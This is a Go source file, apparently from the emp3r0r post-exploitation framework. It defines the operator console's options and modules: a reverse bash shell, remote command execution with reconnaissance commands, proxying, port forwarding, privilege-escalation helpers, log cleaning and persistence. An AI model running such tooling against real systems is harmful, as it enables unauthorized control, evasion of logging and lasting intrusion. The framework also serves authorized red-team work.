package cc

import (
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent"
)

// Option all necessary info of an option
type Option struct {
	Name string   // like `module`, `target`, `cmd_to_exec`
	Val  string   // the value to use
	Vals []string // possible values
}

var (
	// CurrentMod selected module
	CurrentMod = "<blank>"

	// CurrentTarget selected target
	CurrentTarget *agent.SystemInfo

	// Options currently available options for `set`
	Options = make(map[string]*Option)

	// ShellHelpInfo provide utilities like ps, kill, etc
	ShellHelpInfo = map[string]string{
		"bash": "A reverse bash shell from HTTP2 tunnel, press Ctrl-D to leave",
		"ps":   "List processes: `ps`",
		"kill": "Kill process: `kill <PID>`",
		"put":  "Put a file from CC to agent: `put <local file> <remote path>`",
		"get":  "Get a file from agent: `get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		"cmd":         moduleCmd,
		"shell":       moduleShell,
		"proxy":       moduleProxy,
		"port_fwd":    modulePortFwd,
		"lpe_suggest": moduleLPE,
		"get_root":    moduleGetRoot,
		"clean_log":   moduleLogCleaner,
		"persistence": modulePersistence,
	}
)

// SetOption set an option to value, `set` command
func SetOption(args []string) {
	if len(args) < 2 {
		return
	}

	opt := args[0]
	val := args[1:] // in case val contains spaces

	if _, exist := Options[opt]; !exist {
		CliPrintError("No such option: %s", strconv.Quote(opt))
		return
	}

	// set
	Options[opt].Val = strings.Join(val, " ")
}

// UpdateOptions add new options according to current module
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		CliPrintError("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new Option to Options, if exists, return the *Option
	addIfNotFound := func(key string) *Option {
		if _, exist := Options[key]; !exist {
			Options[key] = &Option{Name: key, Val: "<blank>", Vals: []string{}}
		}
		return Options[key]
	}

	var currentOpt *Option
	switch {
	case modName == "cmd":
		currentOpt = addIfNotFound("cmd_to_exec")
		currentOpt.Vals = []string{
			"id", "whoami", "ifconfig",
			"ip a", "arp -a",
			"ps -ef", "lsmod", "ss -antup",
			"netstat -antup", "uname -a",
		}

	case modName == "port_fwd":
		// rport
		portOpt := addIfNotFound("to")
		portOpt.Vals = []string{"127.0.0.1:22", "127.0.0.1:8080"}
		// listen on port
		lportOpt := addIfNotFound("listen_port")
		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
		// on/off
		switchOpt := addIfNotFound("switch")
		switchOpt.Vals = []string{"on", "off"}
		switchOpt.Val = "on"

	case modName == "clean_log":
		// keyword to clean
		keywordOpt := addIfNotFound("keyword")
		keywordOpt.Vals = []string{"root", "admin"}

	case modName == "proxy":
		portOpt := addIfNotFound("port")
		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
		portOpt.Val = "8080"
		statusOpt := addIfNotFound("status")
		statusOpt.Vals = []string{"on", "off"}
		statusOpt.Val = "on"

	case modName == "lpe_suggest":
		currentOpt = addIfNotFound("lpe_helper")
		currentOpt.Vals = []string{"lpe_les", "lpe_upc"}
		currentOpt.Val = "lpe_les"

	case modName == "persistence":
		currentOpt = addIfNotFound("method")
		methods := make([]string, len(agent.PersistMethods))
		i := 0
		for k := range agent.PersistMethods {
			methods[i] = k
			i++
		}
		currentOpt.Vals = methods
		currentOpt.Val = "all"
	}

	return
}

// ModuleRun run current module
func ModuleRun() {
	if CurrentTarget == nil {
		CliPrintError("Target not set, try `target 0`?")
		return
	}
	if Targets[CurrentTarget] == nil {
		CliPrintError("Target not exist, type `info` to check")
		return
	}

	mod := ModuleHelpers[CurrentMod]
	if mod != nil {
		mod()
	} else {
		CliPrintError("Module '%s' not found", CurrentMod)
	}
}
